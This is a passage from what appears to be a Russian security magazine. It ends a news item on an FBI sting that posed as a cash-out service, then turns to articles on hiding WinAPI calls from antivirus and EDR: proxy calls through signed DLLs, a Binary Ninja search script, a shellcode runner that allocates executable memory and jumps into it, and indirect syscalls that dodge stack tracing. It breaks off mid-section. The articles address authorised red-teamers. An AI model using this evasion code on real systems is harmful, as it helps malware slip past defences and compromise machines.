наркоторговцев, хакеров и субъектов, занимающихся другой преступной
деятельностью».
   Согласно судебным материалам, услуги ElonmuskWHM удалось связать
с торговлей наркотиками, вооруженным ограблением и многочисленными
расследованиями хакерских атак, «включая те, которые принесли преступни‐
кам доходы в размере нескольких миллионов долларов». При этом связи
устанавливались как до, так и после захвата личности ElonmuskWHM.
   Интересно, что одним из клиентов «Илона Маска» оказался 20-летний
хакер,  участник  группировки  Scattered  Spider  Ремингтон  Гой  Оглтри
(Remington Goy Ogletree), также известный в сети под ником remi, арестован‐
ный в конце прошлого года.
   Так, через два дня после того, как ФБР провело первый обыск в доме Огл‐
три 23 февраля 2024 года, он связался с ElonmuskWHM через Telegram, так
как уже не раз пользовался услугами обнальщика в 2023 году. «Очевидно, что
тогда Оглтри не знал, что сервис по обналичиванию является частью тайной
операции ФБР», — говорится в судебных документах.
   Сначала Оглтри запросил 50 тысяч долларов наличными, а затем увеличил
запрос до 75 тысяч долларов. После он отправил агентам под прикрытием
криптовалюту вместе с физическим адресом для доставки денег, которые
в итоге были ему отправлены.
   То есть в ходе этой операции ФБР предоставило 75 тысяч долларов
подозреваемому,  связанному с  известной  хакгруппой  Scattered  Spider.
При этом арест Оглтри был произведен лишь год спустя после этих событий,
в ноябре 2024 года.





           Выдержка из судебных документов, касающаяся Оглтри

Даджен отказалась комментировать дело Оглтри, заявив, что «не может ком‐
ментировать продолжающееся расследование». По этой же причине пред‐
ставитель прокуратуры отказалась привести примеры других судебных прес‐
ледований, которые стали возможны благодаря тому, что ФБР почти год
притворялось ElonmuskWHM.
   Специальный агент ФБР Майкл Э. Стэнсбери (Michael  E. Stansbury)



     ФБР будет  использовать все возможные  преимущества в  борьбе
      с преступными сетями, которые наносят ущерб населению, чтобызаявил:«
       задержать этих злоумышленников, конфисковать доходы от их прес-
       туплений и разоблачить их соучастников.                »
COVERSTORY





Все крутые вредоносы стараются прятать
использование  вызовов   WinAPI,  ведь
наличие подозрительных функций в коде
может привести к блокировке исполнения
нашей программы. Существует не так мно‐        MichelleVermishelle                                                                                       @Michaelzhm
го  документированных  способов  скрыть        michael.zhmailo@yandex.ru
вызовы WinAPI, однако у меня есть пара
любопытных  разработок, и я готов ими
поделиться. Мы попрактикуемся в сканиро‐
вании памяти, исследовании компонентов
Windows и даже немного затронем RPC.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Как ты знаешь, любой, даже самый страшный «вирус» — это обычная прог‐
рамма, которая использует те же механизмы и функции, что и легитимный
софт. Можно сказать, идет злоупотребление функциями, доступными любому
разработчику. Иногда встречается абуз недокументированных возможностей.
Одним словом — хакерство!
   Вердикт о признании программы вредоносной антивирус выносит после
анализа и сопоставления множества фактов, но основополагающим всегда
будет анализ используемых функций в коде. Анализировать можно разные
вещи: хуки, таблицы импортов, поток исполнения, в сложных случаях может
производиться быстрая декомпиляция. Хакеры, в свою очередь, научились
анхукать, прятать IAT, применять API Hashing и предотвращать загрузку DLL.
   Представь, а что, если бы мы смогли избежать использования подоз‐
рительных функций? Буквально: не трогаем всякие опасные штуки, а нас
не трогает антивирус!
   Например, вместо VirtualAllocEx() можно дергать что‑нибудь альтер‐
нативное, как делали в статье про шелл‑код‑раннер на чистом C#. И это воз‐
можно! Существует несколько техник, позволяющих идти обходным путем,
не затрагивая «подозрительные» методы или всячески скрывая их исполь‐
зование.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

    КРИВАЯ ДОРОЖКА
         ОБФУСЦИРУЕМ ВЫЗОВЫ WINAPI
              НОВЫМИ СПОСОБАМИ





ПРОКСИРОВАНИЕ ВЫЗОВОВ

Теория
У западных коллег эта техника называется Proxy Invoke. Она основана на том,
что хакер обнаруживает такую функцию, которая дергает нужные вещи, «прок‐
сируя»  вызов.  Фактически  идет  злоупотребление  чужими  обвязками
над существующими методами.
   Пример: у нас есть функция ZwProtectVirtualMemory(), она позволяет
изменить разрешения памяти. Считается, так скажем, не самой безобидной,
ведь с ее помощью можно пометить адресное пространство как исполня‐
емое. При попытке ее использования может  вылезти алерт, например
у Elastic.





                            Пример алерта


        WWW

                           Интересное по теме:
                        •Doubling Down: Detecting  In- Memory Threats
                             with Kernel ETW Call Stacks
                       •Твит @dez_


Нас интересует этот: VirtualProtect API Call from an Unsigned DLL. Логика
детекта проста: если функция вызывается из адресного пространства непод‐
писанной библиотеки, то вызов считается вредоносным. Подобные рас‐
суждения имеют право на жизнь, ведь зачем обычному разработчику дергать
Zw-функцию из своей программы? Явно что‑то нечисто...
   Обход такого детекта возможен через проксирование. Нам нужно найти
легитимный,  подписанный бинарь с  экспортируемой  функцией, которая
передает поток управления в целевую функцию.
  Был такой поток управления:


malware → ntdll!ZwProtectVirtualMemory

Станет вот такой:


malware → signed!SomeFuncToProtectMemory →
ntdll!ZwProtectVirtualMemory

И детекта не будет! Ведь цепочка вызовов начинается из легитимной, под‐
писанной библиотеки. Схожую логику в чуть более упрощенном формате
предлагает инструмент Parasite-Invoke. Однако он работает только с прог‐
раммами на C#.
  С некоторой натяжкой можно сказать, что подобное проксирование ког‐
да‑то победило на премии Pentest Award. Конечно, там еще использовалась
подмена оригинального метода, однако логика осталась схожей: имитация
активности, происходящей из легитимного модуля.


Обнаружение прокси-функций
Таблица экспортов/импортов
Есть путь простой, а есть путь самурая. Начнем с простого. Он заключается
в том, чтобы быстро проанализировать все существующие в системе под‐
писанные DLL и определить использование в них функций, до которых мы
можем дотянуться. Варианта два.
 • Можем  идти  от  таблицы  импортов.  Например,  видим  импорт
  ZwProtectVirtualMemory() , после чего находим место, в котором эта
   функция дергается, и смотрим, есть ли возможность контроля аргументов.
 • Можем идти от таблицы экспортов. Например, видим экспорт функции
  AllocateAndProtectSomeMemory() ,  догадываемся о  потенциально
   интересной функциональности и исследуем эту функцию.

Для подобного анализа подойдет скрипт findSymbols.py.
   Например,  вот   так  можно   обнаружить  все  импорты   функции
MiniDumpWriteDump().





           Пример запуска findSymbols.py с анализом импортов

А так — проанализировать экспорты:


 python .\findSymbols.py "c:\windows\system32" -s "memory" -e





                 Пример запуска с анализом экспортов

Однако далеко не все функции объявляются экспортируемыми, поэтому мож‐
но также прибегнуть к анализу символов, как я это делал в SymProcAddress,
разбор — в моей статье на «Хабрахабре». Но все равно как‑то много «если»
и лишнего ресерча. Хочется автоматизировать и сразу дергать нужную фун‐
кцию, правда? А вот это уже бусидо!


Бинарный анализ
Путь самурая — автоматизировать этап исследования бинарных файлов
с помощью API какого‑нибудь декомпилера. Этот метод я стащил у чувака
с ником cryptoplague. Он использует Binary Ninja для автоматизации анализа
подписанных библиотек DLL. Рассмотрим его код подробнее.


import os
import binaryninja
from binaryninja import highlevelil


signed_dlls_path = r'C:\Users\user\source\repos\SignedDllAnalyzer\
signed_dlls.txt'


with open(signed_dlls_path, "r") as f:
    signed_dlls = [dll.strip() for dll in f]


total_dlls = len(signed_dlls)


with open(signed_dlls_path, "r") as f:
    current_dll = 0
    for signed_dll_path in f:
        current_dll += 1
        signed_dll_path = signed_dll_path.strip()
        dll_name = signed_dll_path.split('\\')[-1]
        dll_size_mb = os.path.getsize(signed_dll_path) / 1024 / 1024
        progress = f"{current_dll}/{total_dlls}"
        if dll_size_mb > 15:
            print(f"[-] [{progress}] [{dll_name}] [{dll_size_mb:.2f}
> 15 MB]")
            continue
        print(f"[*] [{progress}] [{dll_name}] [{dll_size_mb:.2f} MB]"
)
        with binaryninja.load(signed_dll_path, update_analysis=False)
as binary_view:
            ntAllocateVirtualMemorySymbol = binary_view.
get_symbol_by_raw_name("NtAllocateVirtualMemory")
            if not ntAllocateVirtualMemorySymbol:
                continue
            else:
                print(f"[+] [{progress}] [{dll_name}] [
NtAllocateVirtualMemory]")
                binary_view.set_analysis_hold(False)
                binary_view.update_analysis_and_wait()
                code_refs = binary_view.get_code_refs(
ntAllocateVirtualMemorySymbol.address)
                for ref in code_refs:
                    try:
                        func = binary_view.get_functions_containing(
ref.address)[0]
                        hlil_instr = func.get_llil_at(ref.address).
hlil
                        for operand in hlil_instr.operands:
                            if type(operand) == HighLevelILCall:
                                if operand.dest.value.value ==
ntAllocateVirtualMemorySymbol.address:
                                    hlil_call = operand
                                    break
                        args = hlil_call.params
                        protect = args[5]
                        regionSize = args[3]
                        if type(protect) == HighLevelILVar:
                            if protect.var not in func.parameter_vars
:
                                continue
                        if type(regionSize) == HighLevelILVar:
                            if regionSize.var not in func.
parameter_vars:


                        if type(protect) == HighLevelILConst:
                            if int(protect.value) != 0x40:
                                continue
                        if type(regionSize) == HighLevelILConst:
                            if int(regionSize.value) <= 0x10000:
                                continue


                        print(f"[+] [{progress}] [{dll_name}] [{hex(
ref.address)}] [{hlil_instr}]")
                    except Exception as e:
                        print(f"[x] [{progress}] [{dll_name}] [{e}]")

Давай разберем скрипт пошагово, тут есть несколько нетривиальных момен‐
тов.
   Итак, все начинается с чтения текстового файла, в котором лежат пути
с подписанными библиотеками. Например, C:\Windows\System32.


import os
import binaryninja
from binaryninja import highlevelil


signed_dlls_path = r'C:\Users\user\source\repos\SignedDllAnalyzer\
signed_dlls.txt'


with open(signed_dlls_path, "r") as f:
    signed_dlls = [dll.strip() for dll in f]


total_dlls = len(signed_dlls)

Затем в цикле анализируется каждая библиотека.


with open(signed_dlls_path, "r") as f:
    current_dll = 0
    for signed_dll_path in f:
        current_dll += 1
        signed_dll_path = signed_dll_path.strip()
        dll_name = signed_dll_path.split('\\')[-1]
        dll_size_mb = os.path.getsize(signed_dll_path) / 1024 / 1024
        progress = f"{current_dll}/{total_dlls}"
        if dll_size_mb > 15:
            print(f"[-] [{progress}] [{dll_name}] [{dll_size_mb:.2f}
> 15 MB]")
            continue
        print(f"[*] [{progress}] [{dll_name}] [{dll_size_mb:.2f} MB]"
)
        with binaryninja.load(signed_dll_path, update_analysis=False)
as binary_view:

Дальше программа проверяет размер каждой библиотеки и не анализирует
те, что занимают больше 15 Мбайт. Те, что меньше, передаются в Binary Ninja
для бинарного анализа через метод load().


Binary Ninja и BinaryView
Здесь важно знать, что у Binary Ninja есть не только GUI, но и API, через
который можно загрузить бинарный файл и провести некоторый автомати‐
ческий анализ.
   Бинарник будет  представлен в виде  объекта  BinaryView, он же  bv
в документации. Он предоставляет набор методов по работе с файлом, нап‐
ример получение списка функций.


 >>> bv
 <BinaryView: '/bin/ls', start 0x100000000, len 0x182f8>
 >>> len(bv.functions)
 140


Через  BinaryView  можно  извлечь  класс  Function,  который  указывает
на (неожиданно!) функцию в коде.
   Функция будет представлена в виде BNIL — Binary Ninja Intermediate
Language. Это особый вид ассемблерных инструкций для Binary Ninja. Есть
несколько форм: LLIL, MLIL, HLIL, Pseudo-C, они различаются глубиной абс‐
тракции. Чем выше уровень, тем более человекочитаемый код получаем. Чем
ниже, тем более приближенный к тому, что исполняет компьютер.
   Отдельно  поддерживается отображение в форме SSA  (Static  Single
Assignment). Это такой механизм оптимизации кода компилятором, главный
концепт которого — присвоение конкретной переменной значения только
в одном месте в коде.


Наш алгоритм поиска функций будет таким:
 1. Получить BinaryView.
 2. Обнаружить, что используется нужная нам функция.
 3. Определить место, из которого вызывается нужная нам функция.
 4. Убедиться, что мы можем  контролировать  аргументы, передаваемые
   в функции.

Это все автоматизируется с помощью Binary Ninja. Сначала делаем поиск
символа. Если символа нет, значит, и использования функции нет.


ntAllocateVirtualMemorySymbol = binary_view.get_symbol_by_raw_name("
NtAllocateVirtualMemory")
if not ntAllocateVirtualMemorySymbol:
    continue
else:
    print(f"[+] [{progress}] [{dll_name}] [NtAllocateVirtualMemory]")

Убедившись,   что  метод    присутствует,   запускаем   анализ.  Метод
set_analysis_hold() «включает анализ», а update_analysis_and_wait() его осу‐
ществляет.


binary_view.set_analysis_hold(False)
binary_view.update_analysis_and_wait()

После того как BN провел анализ бинарного кода, можно приступать к пункту
три. Обнаруживаем  места, ссылающиеся на нужный нам метод, через
get_code_refs().


code_refs = binary_view.get_code_refs(ntAllocateVirtualMemorySymbol.
address)

Затем пробегаемся в цикле по всем ссылкам, находя функции, которые ссы‐
лаются на нужный нам метод.


for ref in code_refs:
    try:
        func = binary_view.get_functions_containing(ref.address)[0]

Далее убеждаемся, что происходит именно вызов функции, а не просто ссыл‐
ка на адрес.


hlil_instr = func.get_llil_at(ref.address).hlil
for operand in hlil_instr.operands:
    if type(operand) == HighLevelILCall:
        if operand.dest.value.value == ntAllocateVirtualMemorySymbol.
address:
            hlil_call = operand
            break

Для этого мы получаем LLIL (низкоуровневое представление инструкций)
по адресу, следующим шагом конвертируем в HLIL и убеждаемся по наличию
операнда Call, что происходит вызов функции.
   Наконец, получаем параметры функции, а также анализируем, можем ли
мы воздействовать на эти переменные из параметров функции‑обертки.


args = hlil_call.params
protect = args[5]
regionSize = args[3]
if type(protect) == HighLevelILVar:
    if protect.var not in func.parameter_vars: # Проверка на наличие
в параметрах родительской функции
        continue
if type(regionSize) == HighLevelILVar:
    if regionSize.var not in func.parameter_vars:


if type(protect) == HighLevelILConst:
    if int(protect.value) != 0x40:
        continue


if type(regionSize) == HighLevelILConst:
    if int(regionSize.value) <= 0x10000:
        continue
print(f"[+] [{progress}] [{dll_name}] [{hex(ref.address)}] [{
hlil_instr}]")

С помощью этого скрипта получилось обнаружить место, в котором исполь‐
зуется функция NtAllocateVirtualMemory() внутри verifier.dll.





                            Пример работы

Дальнейшим      исследованием     была      обнаружена      функция
DphCommitMemoryFromPageHeap() из verifier.dll, внутри которой и дер‐
галась NtAllocateVirtualMemory().





                          Обнаруженная функция

А вот и наша NtAllocateVirtualMemory()!





                              Вызов функции


Пример с DphCommitMemoryFromPageHeap
После того как мы смогли найти нужную функцию, следует добиться передачи
потока управления по этому адресу. Есть два варианта:
 • определить смещение функции относительно базового адреса загрузки
  DLL в памяти;
 • определить адрес целевой функции по байтовому паттерну.

Воспользуемся вторым вариантом. Здесь нам поможет IDA, а также сканиро‐
вание памяти по опкодам. Начнем с определения начальных инструкций фун‐
кции.





        Инструкции, которые будем использовать для поиска функции

Затем переводим их в опкоды, по которым будем осуществлять сканиро‐
вание.





                                Опкоды

Определяем прототип функции для вызова.


typedef int (WINAPI* DphCommitMemoryFromPageHeapFunc)(
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG Protect
    );

Добавляем код по скану памяти и передаем на функцию поток управления!


int main()
{
    HMODULE hModule = NULL;


    hModule = LoadLibraryA("verifier.dll");
    DphCommitMemoryFromPageHeapFunc DphCommitMemoryFromPageHeapWPtr =
(DphCommitMemoryFromPageHeapFunc)(FindFunction(GetCurrentProcess(),
GetFunctionBytes(), (uintptr_t)hModule));
    SIZE_T size = 0xABCD;
    LPVOID addr = nullptr;
    NTSTATUS err = DphCommitMemoryFromPageHeapWPtr(&addr, &size,
PAGE_EXECUTE);
    std::wcout << err << std::endl;


    return 0;
}

Полный код представлен тут. И видим результат вызова.





                     Возврат STATUS_INVALID_HANDLE

Сам   автор   в   своем   ресерче   предлагает   вызывать   функцию
AVrfpNtAllocateVirtualMemory(), он  дергает ее по  оффсету, но  ты
можешь, в качестве тренировки, сделать получение адреса по паттерну.


typedef NTSTATUS (*AVrfpNtAllocateVirtualMemory_t)
(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    ULONG_PTR *RegionSize,
    ULONG AllocationType,
    ULONG Protect
);


DWORD protect{};
LPVOID virtualMemory = nullptr;
SIZE_T size = rawShellcodeLength;


HMODULE hVerifierMod = this->api.LoadLibraryA.call("verifier.dll");


AVrfpNtAllocateVirtualMemory_t AVrfpNtAllocateVirtualMemory = (
AVrfpNtAllocateVirtualMemory_t)((char*)hVerifierMod + 0x25110);
AVrfpNtAllocateVirtualMemory(NtCurrentProcess(), &virtualMemory, 0, &
size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);


this->api.RtlMoveMemory.call(virtualMemory, rawShellcode,
rawShellcodeLength);


(*(int(*)()) virtualMemory)();


Через RPC
Скажу честно, проксирование через вызовы — достаточно сложный метод,
объяснение которого не уместится в одну статью. По этому способу был даже
представлен доклад на конференции. Однако я постараюсь описать вкратце.
  При взаимодействии устройств через протокол RPC происходят операции
маршалинга и демаршалинга передаваемых параметров. Это необходимо,
так как аргументы функции передаются по сети и сложные структуры просто
так в сокет не засунуть.
   Обработка данных происходит в специальных NDR-функциях (NDR —
Network Data Representation). Сами данные попадают внутрь этих функций
в виде структуры RPC_MESSAGE. Внутри нее достаточно большая вложен‐
ность других структур, манипулируя которыми мы можем передать поток
управления по произвольному адресу.





             Передача потока управления из MIDL_SERVER_INFO

У этого метода есть свои особенности: как минимум необходимо инициали‐
зировать среду RPC в текущем процессе. Существует демонстрация работы
на YouTube, а также PoC на GitHub.
   Таким образом, с помощью подсистемы RPC мы можем дергать любую
WinAPI-функцию с передачей аргументов, что будет считаться одной из форм
проксирования.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

    КРИВАЯ ДОРОЖКА
         ОБФУСЦИРУЕМ ВЫЗОВЫ WINAPI
              НОВЫМИ СПОСОБАМИ





ИСПОЛЬЗУЕМ АЛЬТЕРНАТИВНЫЕ ФУНКЦИИ

Теория
Пора выдохнуть и перейти к чуть более простому методу. В случае с альтер‐
нативными функциями мы будем пытаться найти обходной путь до нужных нам
возможностей. Например, вместо использования функции memcpy() собс‐
твенноручно писать логику метода и копировать данные с помощью указате‐
лей, ручками. Или как вариант — обнаружить и дергать чуть более низкоуров‐
невый, потенциально нехукнутый аналог.
  В принципе, этот вариант достаточно тесно связан с прокси‑функциями,
ведь какой‑то метод может дергать оригинальную функцию под капотом, быть
оберткой над оберткой... В общем, реверсить каждую запаришься. Глав‐
ное — найти иной WinAPI-вызов, альтернативу.


Замена CRT
Проще всего начать с замены CRT-функций. Например, так можно заменить
функцию memcpy():


PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
    for (volatile int i = 0; i < Size; i++) {
        ((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
    }
    return Destination;
}

Вот так — сравнение строк через wcscmp():


int custom_wcscmp(const wchar_t* str1, const wchar_t* str2) {
    while (*str1 == *str2 && *str1 != L'\0') {
        str1++;
        str2++;
    }


    return *str1 - *str2;
}

А так — преобразование из нижнего регистра в верхний:


PCHAR CaplockStringA(_In_ PCHAR Ptr)
{
    PCHAR sv = Ptr;
    while (*sv != '\0')
    {
        if (*sv >= 'a' && *sv <= 'z')
            *sv = *sv - ('a' - 'A');
        sv++;
    }
    return Ptr;
}


PWCHAR CaplockStringW(_In_ PWCHAR Ptr)
{
    PWCHAR sv = Ptr;
    while (*sv != '\0')
    {
        if (*sv >= 'a' && *sv <= 'z')
            *sv = *sv - ('a' - 'A');
        sv++;
    }
    return Ptr;
}

В CRT очень много функций, и практически все возможно переписать, вруч‐
ную реализовав логику их работы. Больше вариантов ищи в репозиториях
NOCRT и vx-api.


Через ссылки на структуры Windows
Обычно в Windows используются одни и те же структуры в функциях со схожей
логикой работы. Таким образом, у нас  появляется возможность искать
похожие функции. Проще всего искать через IDE. Для этого нужно будет най‐
ти заголовочный файл, в котором есть интересующая нас структура.


             INFO

                           Искать прокси‑функции можно тем же методом,
                          поэтому не будем останавливаться на них отдель‐
                          но.


Итак, пусть у нас есть функция SetThreadContext(), которая принимает струк‐
туру CONTEXT.
   Структура CONTEXT определена в файле winnt.h.





                     Определение структуры CONTEXT

Нажимаем на PCONTEXT, кликаем правой кнопкой мыши и выбираем «Найти
все ссылки».





                                Поиск ссылок

Получаем большой список ссылок на эту структуру из разных функций.





                              Список ссылок

Начинаем исследовать и обнаруживаем функцию RtlCaptureContext2()
со схожими возможностями!





                            Альтернативная функция


Изучаем COM
Подсистема COM предоставляет нам огромное количество всяких фич. Нуж‐
но лишь изучить ее и понять ее особенности: что такое класс COM, как они
регистрируются в системе, как работают интерфейсы и методы и так далее.
Проштудировав это, ты сможешь обнаружить множество интересных вещей!


        WWW

                      У   меня    есть    небольшой    репозиторий
                      COMThanasia, который поможет тебе в изучении
                   COM.


Например, у объекта {00000618-0000-0010-8000-00aa006d2ea4} существу‐
ет интерфейс, внутри которого есть метод ChangePassword(), предваритель‐
но это метод может использоваться для смены пароля пользователя. Таким
образом, дергая ChangePassword() из COM, ты можешь избежать вызова
функций из netapi.dll.





                             Интересный метод


Замена ReadProcessMemory()
Наконец, давай покажу еще пару интересных «обходных путей» для вызова
функций. На текущий момент известно несколько способов замены методов
ReadProcessMemory():
 • через злоупотребление уязвимыми драйверами, например wnbios64.sys;
 • через RtlFirstEntrySList().

Первый вариант очевиден: драйвер предоставлял уязвимый метод, пригод‐
ный для чтения памяти. А вот второй чуть более сложный. Исследователь
под ником x86matthew обнаружил функцию RtlFirstEntrySList(), которая
получала адрес и возвращала значение по нему.


DWORD __stdcall RtlFirstEntrySList(DWORD *pValue)
{
    return *pValue;
}

Если   вызывать    эту   функцию   в    удаленном    процессе   через
CreateRemoteThread() или NtCreateThreadEx(), то можно добиться при‐
митива чтения данных. Автор удалил PoC и статью из своего блога, впрочем,
все сохранено в Internet Archive, ссылка выше.
   Если мы работаем из кода на С#, то стоит обратить внимание на System.
StubHelpers.GetNDirectTarget().


public static IntPtr ReadMemory(IntPtr addr)
{
    var stubHelper = typeof(System.String).Assembly.GetType("System.
StubHelpers.StubHelpers");
    var GetNDirectTarget = stubHelper.GetMethod("GetNDirectTarget",
System.Reflection.BindingFlags.NonPublic | System.Reflection.
BindingFlags.Static);
    IntPtr unmanagedPtr = Marshal.AllocHGlobal(200);
    for (int i = 0; i < 200; i += IntPtr.Size)
    {
        Marshal.Copy(new[] { addr }, 0, unmanagedPtr + i, 1);
    }
    return (IntPtr)GetNDirectTarget.Invoke(null, new object[] {
unmanagedPtr });
}


Замена WriteProcessMemory()
В той же статье x86matthew предложил альтернативу записи в память. Она
тоже основана на функциях инкремента и декремента значения по адресу.
Множественными вызовами этих функций для адреса в процессе мы можем
изменять значения в памяти, а значит, записывать.


LONG __stdcall InterlockedIncrement(LONG *Addend);
LONG __stdcall InterlockedDecrement(LONG *Addend);


Где искать альтернативы
Если тебе стало интересно обнаруживать подобные возможности, рекомен‐
дую изучить блог VX-Underground. На сайте много интересных разработок,
которые можно использовать в собственном коде. Например, мы могли бы
запускать процесс не вызывая напрямую CreateProcess(), а через ими‐
тацию нажатий Win-R. Согласись, это круто!


ВЫВОДЫ

Обфускация вызовов WinAPI — крайне творческий и любопытный процесс.
Нужно пытаться смотреть на систему под новыми углами и мыслить нес‐
тандартно. Если вдруг получается отойти от проторенной дороги, можно ока‐
заться вне поля зрения антивирусных радаров!
COVERSTORY





Все чаще системы EDR стали прибегать
к такой могучей технике, как трассировка
стека   вызовов,   чтобы   обнаруживать
деятельность   зловредных   приложений
и портить жизнь редтимерам. В этой статье              Nik Zerof                                                                                              xtahi0nix@gmail.com
я  расскажу,  как  работает  этот  метод,
а потом попробуем сыграть в прятки с EDR
и вызвать NTAPI так, чтобы даже раскрутка
стека не обнаружила подвоха.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



КАК УСТРОЕНЫ WINAPI INDIRECT CALLS

Зачем изобретать что‑то новое, если есть такая техника, как Indirect Calls
для вызовов WinAPI? У нее есть свои сильные стороны, она проста в реали‐
зации и хорошо документирована. В двух словах напомню, в чем ее суть.
    Indirect Syscalls вызывает NTAPI не напрямую через ntdll.dll, а через
собственный код, который эмулирует вызов функции NTAPI: формируется стек
аргументов, в eax заносится номер системного сервиса для его вызова,
далее выполняется переход по адресу инструкции syscall в самой ntdll.
dll. Вот условный код:


// Ранее сформирован стек аргументов, далее сам вызов WinAPI из
ntdll.dll
mov r10, rcx
mov eax, <syscall_number>
jmp <address_of_syscall_instruction_in_ntdll>

Со стороны выглядит хорошо, и это работало, пока EDR не научились исполь‐
зовать трассировку событий ETW для раскрутки системного стека вызовов.
Все дело в том, что техника Indirect Syscalls позволяет избежать детектирова‐
ния на уровне пользовательского режима, но оставляет следы в  стеке
вызовов. EDR может анализировать стек, раскручивая его, и обнаруживать
эти аномалии.


СТЕК, ФРЕЙМЫ И EDR

Для дальнейшего понимания  придется немного  погрузиться в матчасть
и понять, как формируются и работают стековые фреймы. Стековый фрейм
(или кадр стека) — это область памяти в стеке, выделяемая для выполнения
каждой функции в программе. Он содержит такие данные, как параметры
функции, локальные переменные, значения регистров, адрес возврата. Прос‐
той пример кода:


void func1() {
    int x = 10;
    func2(x);
    ...
    ...
}


void func2(int y) {
    int z = y + 5;
}

При вызове func2(x) будет сформирован фрейм:
 • RSP — переменная z ;
 • RBP — базовый указатель предыдущего фрейма;
 • RBP + 8 — указатель на следующую инструкцию в func1() (адрес воз‐
    врата);
 • RBP + 16 — параметр функции func2.

Итак, стало ясно, что стековые фреймы формируются при вызове каждой
функции и содержат массу полезной информации, в том числе указатель
на предыдущий фрейм (считай, функцию). Именно так EDR и разворачивают
поток управления, если замечают подозрительное поведение в системе.
Как ты понимаешь, против этой техники обнаружения не спасут популярные
методы обфускации вызовов WinAPI, но мы попробуем подделать фрейм, что‐
бы обмануть EDR.


             INFO

                         Event Tracing for Windows (ETW) — это технология,
                          встроенная  в  Windows,  которая   позволяет
                       собирать  и  записывать  данные  о  событиях
                       из различных системных компонентов и приложе‐
                         ний. ETW предоставляет эффективные средства
                       для  телеметрии,  включая  сбор  информации
                      о стеке вызовов, что особенно полезно для диаг‐
                            ностики, мониторинга производительности и ана‐
                       лиза безопасности.



КАК EDR НАБЛЮДАЕТ ЗА СТЕКОМ

Все дело в том, что EDR знает, как должен выглядеть стек при той или иной
ситуации, и, если в его структуре наблюдается отклонение от нормы, сра‐
батывает алерт. Например, EDR проверяет:
 • откуда был выполнен переход к syscall. Если переход был выполнен
   из региона памяти, который не принадлежит ntdll.dll (например, куча
   или выделенная память), это считается аномалией;
 • права доступа к региону памяти, из которого был выполнен переход. Если
   регион имеет права PAGE_EXECUTE_READWRITE , это может быть приз‐
   наком косвенного вызова или шелл‑кода;
 • куда вернется выполнение после завершения системного вызова. Если
   возвращаемый адрес указывает на пользовательскую память, это тоже
   считается аномалией.

Теперь посмотрим, как выглядит правильная с точки зрения EDR структура
стека вызовов при аллокации памяти из пользовательского приложения:


0x00007ffb`12345678  ntdll!NtAllocateVirtualMemory
0x00007ffb`12345555  kernel32!VirtualAlloc
0x00007ffb`12345432  MyProgram!Main

Здесь приложение MyProgram из функции main выделяет память при помощи
VirtualAlloc,   которая   вызывает   NTAPI   NtAllocateVirtualMemory
из ntdll.dll. Что происходит, если выполняется ручной вызов NTAPI (собс‐
твенноручное формирование стека и регистров для вызова)? Программа
выполняет косвенный вызов:


mov r10, rcx
// Номер NtAllocateVirtualMemory в сервисной таблице
mov eax, 0x18
// Вызов сискола по адресу в ntdll.dll
jmp 0x00007ffb`12345678

EDR захватывает стек вызовов:


0x00007ffb`12345678  ntdll!NtAllocateVirtualMemory
// Адрес в пользовательской памяти (где мы формировали аргументы),
откуда был выполнен переход к сисколу внутри ntdll.dll
0x000001a3`45678901  [RX Region]
0x00007ffb`12345432  MyProgram!Main

Мы видим, что возвращаемый адрес указывает на ntdll.dll, но стек начина‐
ется из пользовательской памяти, — алерт!
   Оказывается, косвенные вызовы не так сложно обнаружить, как могло
казаться. Что ж, будем придумывать лекарство!


ЗАПУСКАЕМ NTAPI БЕЗ СЛЕДОВ

В одной из предыдущих статей я рассказывал об инъекции кода методом
PoolParty, который использовал механизм Windows Thread Pools. Здесь я
покажу вызов NTAPI при помощи того же механизма. Надо сказать, что это не
единственный механизм Windows, при помощи которого можно проксировать
вызовы NTAPI, но один из более‑менее изученных.
   Функции TpAllocWork, TpPostWork и TpReleaseWork, которые нам инте‐
ресны, используются для управления задачами в Windows Thread Pools. Эти
функции позволяют создавать, запускать и освобождать задачи, которые
обрабатываются пулом потоков Windows, что облегчает параллельное выпол‐
нение  кода.  Разумеется, эти  функции полностью  недокументированные
и находятся в ntdll.dll. Их мы и используем для вызова NTAPI в обход
мониторинга стека. Для этого посмотрим на прототипы.
   Функция TpAllocWork создает новое задание, которое может быть выпол‐
нено пулом потоков. При создании задания нужно указать колбэк‑функцию,
которая будет выполнена, когда пул потоков начнет обработку этого задания.


PTP_WORK TpAllocWork(
    PTP_WORK_CALLBACK WorkCallback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
);

Параметры:
 • WorkCallback — указатель на функцию обратного вызова, которая будет
   вызвана для выполнения задания;
 • Context — указатель на пользовательский контекст, который передается
   в функцию обратного вызова;
 • CallbackEnviron — указатель на структуру TP_CALLBACK_ENVIRON ,
   которая настраивает окружение для задания. Этот параметр может быть
  nullptr, чтобы использовать среду по умолчанию.

Отработав, TpAllocWork возвращает указатель на PTP_WORK (объект работы
пула потоков) при успехе или nullptr при ошибке.
   Далее идет функция TpPostWork, которая  ставит созданное задание
в очередь пула потоков для выполнения. Эта функция активирует выполнение
задания, созданного с помощью TpAllocWork.


void TpPostWork(
    PTP_WORK Work
);

Единственный параметр PTP_WORK Work — указатель на рабочий объект пула
потоков, который был создан с помощью TpAllocWork.
   Последняя функция, TpReleaseWork, освобождает объект задания. Она
необходима, чтобы освободить ресурсы, выделенные для задания, созданно‐
